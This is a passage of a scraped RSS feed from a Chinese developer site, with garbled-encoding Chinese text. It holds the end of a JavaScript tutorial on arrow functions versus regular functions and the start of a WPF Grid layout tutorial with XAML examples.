<span class="hljs-keyword">const</span> <span class="hljs-title function_">compose</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> fns.<span class="hljs-title function_">reduceRight</span>(<span class="hljs-function">(<span class="hljs-params">acc, fn</span>) =&gt;</span> <span class="hljs-title function_">fn</span>(acc), x);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">double</span> = x =&gt; x * <span class="hljs-number">2</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = x =&gt; x + <span class="hljs-number">1</span>;
<span class="hljs-keyword">const</span> doubleThenIncrement = <span class="hljs-title function_">compose</span>(increment, double);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">doubleThenIncrement</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 11 (5*2+1)</span>
</code></pre>
<h3 data-id="heading-11">3.2 ä½•æ—¶ä½¿ç”¨æ™®é€šå‡½æ•°</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. æ„é€ å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>;
};

<span class="hljs-comment">// 2. å¯¹è±¡æ–¹æ³•ï¼ˆéœ€è¦è®¿é—®å¯¹è±¡å±æ€§ï¼‰</span>
<span class="hljs-keyword">const</span> calculator = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">amount</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> += amount;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  },
  <span class="hljs-attr">getValue</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
  }
};

<span class="hljs-comment">// 3. éœ€è¦ arguments å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sumAll</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">arguments</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">total, num</span>) =&gt;</span> total + num, <span class="hljs-number">0</span>);
}

<span class="hljs-comment">// 4. ç”Ÿæˆå™¨å‡½æ•°</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">idGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> id = <span class="hljs-number">1</span>;
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
    <span class="hljs-keyword">yield</span> id++;
  }
}

<span class="hljs-comment">// 5. é€’å½’å‡½æ•°ï¼ˆéœ€è¦å‡½æ•°åï¼‰</span>
<span class="hljs-keyword">const</span> factorial = <span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) {
  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
  <span class="hljs-keyword">return</span> n * <span class="hljs-title function_">factorial</span>(n - <span class="hljs-number">1</span>);
};

<span class="hljs-comment">// 6. äº‹ä»¶å¤„ç†å™¨ï¼ˆéœ€è¦ this æŒ‡å‘äº‹ä»¶ç›®æ ‡ï¼‰</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘ element</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>); <span class="hljs-comment">// æŒ‡å‘ç‚¹å‡»çš„å…ƒç´ </span>
});

<span class="hljs-comment">// 7. éœ€è¦è¢«è°ƒç”¨æ—¶ç»‘å®šä¸åŒ this çš„å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">greeting</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
}
<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greet.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">'Hello'</span>)); <span class="hljs-comment">// "Hello, Alice"</span>
</code></pre>
<h2 data-id="heading-12">4. å¸¸è§é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// é™·é˜±1ï¼šç®­å¤´å‡½æ•°ä½œä¸ºå¯¹è±¡æ–¹æ³•</span>
<span class="hljs-keyword">const</span> counter = {
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
  
  <span class="hljs-comment">// é”™è¯¯ï¼šç®­å¤´å‡½æ•°ä¸ä¼šç»‘å®šåˆ° counter</span>
  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// this æŒ‡å‘å¤–å±‚ï¼Œä¸æ˜¯ counter</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// undefined</span>
  },
  
  <span class="hljs-comment">// æ­£ç¡®ï¼šä½¿ç”¨æ™®é€šå‡½æ•°æˆ–ç®€å†™æ–¹æ³•</span>
  <span class="hljs-title function_">incrementCorrect</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>);
  }
};

<span class="hljs-comment">// é™·é˜±2ï¼šåŸå‹æ–¹æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// é”™è¯¯ï¼šç®­å¤´å‡½æ•°ä½œä¸ºåŸå‹æ–¹æ³•</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`My name is <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>); <span class="hljs-comment">// this ä¸æ˜¯å®ä¾‹</span>
};

<span class="hljs-comment">// æ­£ç¡®ï¼šä½¿ç”¨æ™®é€šå‡½æ•°</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speakCorrect</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`My name is <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-comment">// é™·é˜±3ï¼šåŠ¨æ€ä¸Šä¸‹æ–‡ä¸­çš„ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
button.<span class="hljs-property">textContent</span> = <span class="hljs-string">'Click me'</span>;

<span class="hljs-comment">// é”™è¯¯ï¼šå¯èƒ½æƒ³è¦ this æŒ‡å‘ button</span>
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘å¤–å±‚ï¼ˆå¯èƒ½æ˜¯ windowï¼‰</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>; <span class="hljs-comment">// é”™è¯¯ï¼</span>
});

<span class="hljs-comment">// æ­£ç¡®ï¼šä½¿ç”¨æ™®é€šå‡½æ•°</span>
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘ button</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
});

<span class="hljs-comment">// æˆ–è€…ä½¿ç”¨ event.target</span>
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>); <span class="hljs-comment">// æŒ‡å‘ button</span>
  event.<span class="hljs-property">target</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
});
</code></pre>
<h2 data-id="heading-13">5. æœ€ä½³å®è·µæ€»ç»“</h2>
<h3 data-id="heading-14">ä½¿ç”¨ç®­å¤´å‡½æ•°çš„æƒ…å†µï¼š</h3>
<ol>
<li><strong>å›è°ƒå‡½æ•°</strong>ï¼Œå°¤å…¶æ˜¯éœ€è¦ä¿æŒå¤–å±‚Â <code>this</code>Â æ—¶</li>
<li><strong>ç®€çŸ­çš„å‡½æ•°è¡¨è¾¾å¼</strong>ï¼Œç‰¹åˆ«æ˜¯å•è¡Œå‡½æ•°</li>
<li><strong>å‡½æ•°å¼ç¼–ç¨‹</strong>ä¸­çš„å°å‡½æ•°</li>
<li><strong>ç«‹å³æ‰§è¡Œå‡½æ•° (IIFE)</strong></li>
<li><strong>ç±»å­—æ®µåˆå§‹åŒ–</strong>ä¸­çš„ç®­å¤´å‡½æ•°ï¼ˆç”¨äºç»‘å®šå®ä¾‹ï¼‰</li>
</ol>
<h3 data-id="heading-15">ä½¿ç”¨æ™®é€šå‡½æ•°çš„æƒ…å†µï¼š</h3>
<ol>
<li><strong>æ„é€ å‡½æ•°</strong>ï¼ˆç±»ï¼‰</li>
<li><strong>å¯¹è±¡æ–¹æ³•</strong>ï¼Œéœ€è¦è®¿é—®å¯¹è±¡å±æ€§</li>
<li><strong>éœ€è¦ arguments å¯¹è±¡</strong></li>
<li><strong>ç”Ÿæˆå™¨å‡½æ•°</strong></li>
<li><strong>é€’å½’å‡½æ•°</strong>ï¼ˆéœ€è¦å‡½æ•°åï¼‰</li>
<li><strong>äº‹ä»¶å¤„ç†å™¨</strong>ï¼Œéœ€è¦Â <code>this</code>Â æŒ‡å‘äº‹ä»¶ç›®æ ‡</li>
<li><strong>éœ€è¦åŠ¨æ€ç»‘å®š this</strong>Â çš„æƒ…å†µ</li>
</ol>
<h3 data-id="heading-16">ä»£ç ç¤ºä¾‹ï¼š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¥½çš„å®è·µ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> };
    
    <span class="hljs-comment">// ä½¿ç”¨ç®­å¤´å‡½æ•°ç»‘å®š this</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> });
    };
  }
  
  <span class="hljs-comment">// ç±»æ–¹æ³•ä½¿ç”¨æ™®é€šå‡½æ•°ï¼ˆæˆ–ç®€å†™è¯­æ³•ï¼‰</span>
  <span class="hljs-title function_">setState</span>(<span class="hljs-params">newState</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>, ...newState };
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ¸²æŸ“é€»è¾‘</span>
  }
}

<span class="hljs-comment">// å‡½æ•°å¼ç¼–ç¨‹</span>
<span class="hljs-keyword">const</span> users = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">active</span>: <span class="hljs-literal">true</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">active</span>: <span class="hljs-literal">false</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">active</span>: <span class="hljs-literal">true</span> }
];

<span class="hljs-keyword">const</span> activeUserNames = users
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">active</span>)           <span class="hljs-comment">// ç®­å¤´å‡½æ•°ç”¨äºè¿‡æ»¤</span>
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>())  <span class="hljs-comment">// ç®­å¤´å‡½æ•°ç”¨äºè½¬æ¢</span>
  .<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a.<span class="hljs-title function_">localeCompare</span>(b));   <span class="hljs-comment">// ç®­å¤´å‡½æ•°ç”¨äºæ¯”è¾ƒ</span>

<span class="hljs-comment">// éœ€è¦ arguments çš„æƒ…å†µ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, ...sources</span>) {     <span class="hljs-comment">// ä½¿ç”¨ rest å‚æ•°</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(target, ...sources);
}

<span class="hljs-comment">// ç›¸å½“äº</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">mergeLegacy</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, target);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(result, <span class="hljs-variable language_">arguments</span>[i]);
  }
  <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>è®°ä½ï¼šç®­å¤´å‡½æ•°ä¸æ˜¯è¦å®Œå…¨æ›¿ä»£æ™®é€šå‡½æ•°ï¼Œè€Œæ˜¯æä¾›äº†å¦ä¸€ç§æ›´é€‚åˆç‰¹å®šåœºæ™¯çš„å‡½æ•°å®šä¹‰æ–¹å¼ã€‚ç†è§£å®ƒä»¬çš„åŒºåˆ«æœ‰åŠ©äºé€‰æ‹©æœ€é€‚åˆçš„å·¥å…·æ¥å®Œæˆå·¥ä½œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[wpf å¸ƒå±€ä¸“é¢˜]]></title>    <link>https://juejin.cn/post/7594791357144662058</link>    <guid>https://juejin.cn/post/7594791357144662058</guid>    <pubDate>2026-01-14T14:37:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144662058" data-draft-id="7594854295759339563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="wpf å¸ƒå±€ä¸“é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:37:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="undefinedåœ¨æ˜é‡‘39041"/> <meta itemprop="url" content="https://juejin.cn/user/1081575171951485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            wpf å¸ƒå±€ä¸“é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575171951485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    undefinedåœ¨æ˜é‡‘39041
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:37:36.000Z" title="Wed Jan 14 2026 14:37:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Gridæ§ä»¶ï¼ˆç½‘æ ¼å¸ƒå±€ï¼‰</h2>
<ul>
<li>
<p>ç»§æ‰¿å…³ç³»: ç»§æ‰¿è‡ªPanelåŸºç±»ï¼Œå®ç°äº†IAddChildæ¥å£</p>
</li>
<li>
<p>å…³é”®å±æ€§:</p>
<ul>
<li>ColumnDefinitions: åˆ—å®šä¹‰é›†åˆ</li>
<li>RowDefinitions: è¡Œå®šä¹‰é›†åˆ</li>
<li>ShowGridLines: æ˜¯å¦æ˜¾ç¤ºç½‘æ ¼çº¿ï¼ˆé»˜è®¤ä¸ºfalseï¼‰</li>
</ul>
</li>
<li>
<p>åˆ—ä½ç½®æ§åˆ¶:</p>
<ul>
<li>Grid.Column="0"è¡¨ç¤ºç¬¬1åˆ—ï¼ˆä»0å¼€å§‹ç´¢å¼•ï¼‰</li>
<li>Grid.Column="1"è¡¨ç¤ºç¬¬2åˆ—</li>
<li><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9fdaf876bbb49269591c9d87d453f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=UmvWYVP1d3lNtUOZBGt%2BWLblCo0%3D" alt="image.png" loading="lazy"/></li>
</ul>
</li>
</ul>
<pre><code class="hljs language-js" lang="js">  &lt;<span class="hljs-title class_">Grid</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid.RowDefinitions</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">RowDefinition</span>/&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">RowDefinition</span>/&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Grid.RowDefinitions</span>&gt;</span></span>
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span>/&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span>/&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span></span>
  
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">Content</span>=<span class="hljs-string">"çº¢è‰²"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"red"</span>   <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"20"</span>/&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">Content</span>=<span class="hljs-string">"é»‘è‰²"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"Black"</span>  <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">Panel.ZIndex</span>=<span class="hljs-string">"1"</span>/&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">Content</span>=<span class="hljs-string">"è“è‰²"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"Blue"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"20"</span>/&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">Content</span>=<span class="hljs-string">"ç»¿è‰²"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"Green"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"20"</span>/&gt;</span></span>
  &lt;/<span class="hljs-title class_">Grid</span>&gt;
</code></pre>
<ul>
<li>
<p>å¸ƒå±€ç‰¹æ€§: æ˜¯WPFçª—ä½“çš„é»˜è®¤æ§ä»¶ï¼Œåˆ›å»ºæ–°çª—ä½“æ—¶è‡ªåŠ¨åŒ…å«Gridæ§ä»¶</p>
</li>
<li>
<p>è·¨è¡Œåˆ—å±æ€§:</p>
<ul>
<li>ColumnSpan: è·¨åˆ—æ•°</li>
<li>RowSpan: è·¨è¡Œæ•°</li>
<li/>
</ul>
</li>
<li>
<p>åˆ—é›†åˆ: é€šè¿‡ColumnDefinitionså±æ€§å®šä¹‰</p>
</li>
<li/>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/334a8ab331ae427b9526e1e187f7df12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=w2FY40HEtUP3b4kqgFp5xXef0BQ%3D" alt="image.png" loading="lazy"/></p>
